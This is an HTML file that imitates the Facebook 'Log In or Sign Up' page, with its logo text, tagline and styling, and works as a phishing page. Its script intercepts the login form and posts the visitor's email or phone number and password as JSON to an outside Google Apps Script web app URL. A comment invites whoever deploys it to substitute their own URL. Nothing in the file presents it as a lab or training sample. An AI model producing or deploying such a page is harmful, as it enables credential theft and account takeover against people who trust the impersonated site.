<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: linear-gradient(white, #D3D8E8);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            display: flex;
            max-width: 980px;
            width: 100%;
            padding: 20px;
            gap: 60px;
            align-items: center;
        }
        
        .left-section {
            flex: 1.2;
            padding-right: 20px;
        }
        
        .facebook-logo {
            font-size: 56px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 16px;
            font-family: 'Klavika Bold', Helvetica, Arial, sans-serif;
        }
        
        .tagline {
            font-size: 28px;
            line-height: 32px;
            color: #1c1e21;
            font-weight: normal;
            max-width: 500px;
        }
        
        .right-section {
            flex: 1;
            max-width: 396px;
        }
        
        .form-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            margin-bottom: 28px;
        }
        
        .form-group {
            margin-bottom: 12px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            line-height: 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            background-color: #f5f6f7;
            color: #1d2129;
            outline: none;
        }
        
        .form-group input:focus {
            border-color: #1877f2;
            background-color: white;
        }
        
        .form-group input::placeholder {
            color: #8a8d91;
        }
        
        .login-button {
            width: 100%;
            padding: 14px 16px;
            font-size: 20px;
            font-weight: bold;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-bottom: 16px;
            transition: background-color 0.2s;
        }
        
        .login-button:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }
        
        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: #dadde1;
        }
        
        .divider span {
            background-color: white;
            padding: 0 20px;
            color: #8a8d91;
            font-size: 14px;
        }
        
        .create-account {
            text-align: center;
        }
        
        .create-account-button {
            background-color: #42b883;
            color: white;
            border: none;
            padding: 14px 16px;
            font-size: 17px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .create-account-button:hover {
            background-color: #36a370;
        }
        
        .page-info {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
            line-height: 20px;
        }
        
        .page-info a {
            color: #1c1e21;
            text-decoration: none;
            font-weight: 600;
        }
        
        .page-info a:hover {
            text-decoration: underline;
        }
        
        #message {
            margin-top: 10px;
            text-align: center;
            color: #42b883;
            font-size: 14px;
        }
        
        #error {
            margin-top: 10px;
            text-align: center;
            color: #f02849;
            font-size: 14px;
        }
        
        @media (max-width: 768px) {
            body {
                background: white;
            }
            
            .container {
                flex-direction: column;
                gap: 30px;
                text-align: center;
            }
            
            .left-section {
                padding-right: 0;
            }
            
            .facebook-logo {
                font-size: 48px;
            }
            
            .tagline {
                font-size: 24px;
                line-height: 28px;
            }
            
            .form-container {
                box-shadow: none;
                border: none;
                padding: 20px 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="facebook-logo">facebook</div>
            <div class="tagline">
                Connect with friends and the world around you on Facebook.
            </div>
        </div>
        
        <div class="right-section">
            <div class="form-container">
                <form id="loginForm">
                    <div class="form-group">
                        <input type="text" id="username" name="username" placeholder="Email or phone number" required>
                    </div>
                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="Password" required>
                    </div>
                    <div class="form-group">
                        <button type="submit" class="login-button">Log In</button>
                    </div>
                </form>
                
                <div class="forgot-password">
                    <a href="#">Forgotten password?</a>
                </div>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <div class="create-account">
                    <button class="create-account-button">Create New Account</button>
                </div>
                
                <div id="message"></div>
                <div id="error"></div>
            </div>
            
            <div class="page-info">
                <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            const errorDiv = document.getElementById('error');
            
            // Replace with your Google Apps Script Web App URL
            const scriptURL = 'https://script.google.com/macros/s/AKfycbxi-k9hCLeYYAk4aRJi7cwG11wBeTj50D8NXjuH2Pewd40xiz_lkfVgQqbwzo0vX2lb/exec';
            
            fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password })
            })
            .then(() => {
                messageDiv.textContent = 'Data submitted successfully!';
                errorDiv.textContent = '';
                document.getElementById('loginForm').reset();
            })
            .catch(error => {
                errorDiv.textContent = 'Error submitting data. Please try again.';
                messageDiv.textContent = '';
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
